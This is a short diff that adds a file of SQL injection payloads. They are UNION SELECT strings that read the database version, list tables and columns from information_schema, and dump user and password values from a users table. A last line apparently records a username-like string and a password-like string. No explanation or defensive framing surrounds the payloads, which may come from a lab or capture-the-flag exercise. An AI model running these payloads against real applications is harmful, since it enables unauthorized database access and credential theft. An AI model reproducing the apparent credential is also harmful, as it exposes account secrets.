@@ -1,0 +1,6 @@
+1' union all select @@version, '1
+1' union all select table_name,1 from information_schema.tables where '1'='1
+1' union all select column_name,column_type from information_schema.columns where table_name='users
+1' union all select user,password from users where '1'='1
+
+nlyt_123	ttdtnlyt
